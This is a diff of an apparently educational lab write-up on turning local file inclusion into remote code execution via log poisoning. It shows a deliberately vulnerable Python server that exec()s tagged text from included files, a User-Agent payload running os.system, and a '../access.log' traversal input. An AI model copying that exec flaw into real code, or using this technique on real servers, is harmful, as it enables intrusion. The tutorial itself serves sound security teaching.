@@ -1,6 +1,6 @@
 # 🛡️ Day 30: LFI Escalation to RCE (Log Poisoning)
 
-**Author:** Bhavishya | **Version:** 1.0 | **Subject:** Advanced Web Exploitation
+**Author:** Bhavishya | **Version:** 1.2 (Final) | **Subject:** Advanced Web Exploitation
 **Level:** 500 (Expert / Red Team)
 
 ---
@@ -14,20 +14,48 @@ If an attacker can write controlled input to a file on the server (like an Apach
 
 ---
 
-## 💻 Lab: The "Dirty Hands" Execution
+## 🗺️ Visualizing the Attack Chain
 
-### 🎯 Objective
+### 🧑‍🍳 The Restaurant Analogy (The Logic)
+```mermaid
+graph TD
+    A[👤 Customer] -->|1. Names self: 'Magic_Tag Unlock_Door Magic_Tag'| B(🧑‍🍳 The Chef)
+    B -->|2. Rule 1: Write name in Diary| C{📖 access.log}
+    A -->|3. Asks Chef to read 'Diary' via LFI| B
+    B -->|4. Reads Diary into Brain| D[🧠 Chef Brain]
+    D -->|5. Panic! Detects Magic Tags| E[✂️ The Scissors]
+    E -->|6. Cuts out command: 'Unlock Door'| F[💥 EXECUTION]
+    F -->|Result| G[🔓 Door Unlocked / System Pwned]
+💻 The Technical Flow (The Code)
+Code snippet
+sequenceDiagram
+    participant U as 👤 Attacker
+    participant S as 🧑‍💻 Server (vulnerable_server.py)
+    participant L as 📄 access.log
+
+    Note over U, L: Phase 1: Poisoning
+    U->>S: Request with Malicious User-Agent (<zenith_exec>...)
+    S->>L: log.write(user_agent) [Poison Stored]
+
+    Note over U, L: Phase 2: Triggering
+    U->>S: LFI Request for ../access.log
+    S->>L: open(full_path, "r")
+    L-->>S: returns log content with payload
+    S->>S: split() [Isolate Python Code]
+    S->>S: exec(payload) [RCE Triggered]
+    S-->>U: Code Execution Result (e.g., pwned_by_rce.txt created)
+💻 Lab: The "Dirty Hands" Execution
+🎯 Objective
 Escalate an LFI vulnerability to RCE by poisoning a custom web server's access log with a malicious Python payload, subsequently using path traversal to execute it.
 
-### 🐍 The Vulnerable Asset: `vulnerable_server.py`
-This script simulates a server that logs User-Agent strings to `access.log` and contains a dangerous dynamic execution flaw when reading included files.
+🐍 The Vulnerable Asset: vulnerable_server.py
+This script simulates a server that logs User-Agent strings to access.log and contains a dangerous dynamic execution flaw when reading included files.
 
-```python
+Python
 import os
 import datetime
 
-print("--- Zenith Web Server v2.0 (with Logging) ---")
-
+# --- RULE 1: THE LOG (The Diary) ---
 def log_request(user_agent):
     with open("access.log", "a") as log:
         log.write(f"[{datetime.datetime.now()}] Request from Agent: {user_agent}\n")
@@ -39,10 +67,10 @@ page_to_load = input("2. Enter page to load (e.g., home.txt): ")
 base_path = "pages/"
 full_path = os.path.join(base_path, page_to_load)
 
+# --- RULE 2: THE EXECUTION (The Scissors) ---
 try:
     with open(full_path, "r") as f:
         content = f.read()
-        print(f"\n[+] Loading {full_path}...\n")
         
         if "<zenith_exec>" in content and "</zenith_exec>" in content:
             print("[!!!] CRITICAL: Executable tags detected in file. Running code...")
@@ -55,12 +83,10 @@ except Exception as e:
 🩸 Raw Output & Logs (The Breach)
 Plaintext
 ➜ python vulnerable_server.py
---- Zenith Web Server v2.0 (with Logging) ---
 1. Enter your User-Agent string: <zenith_exec>import os; os.system("echo 'YOU HAVE BEEN HACKED BY 12ZSE' > pwned_by_rce.txt"); print('RCE SUCCESSFUL: pwned_by_rce.txt created!')</zenith_exec>
 2. Enter page to load (e.g., home.txt): ../access.log
 
 [+] Loading pages/../access.log...
-
 [!!!] CRITICAL: Executable tags detected in file. Running code...
 RCE SUCCESSFUL: pwned_by_rce.txt created!
 🏁 Proof of Execution
@@ -115,3 +141,4 @@ PortSwigger Web Security Academy: File path traversal labs.
 HackTricks: LFI to RCE via Log Poisoning
 
 PayloadsAllTheThings - File Inclusion
+
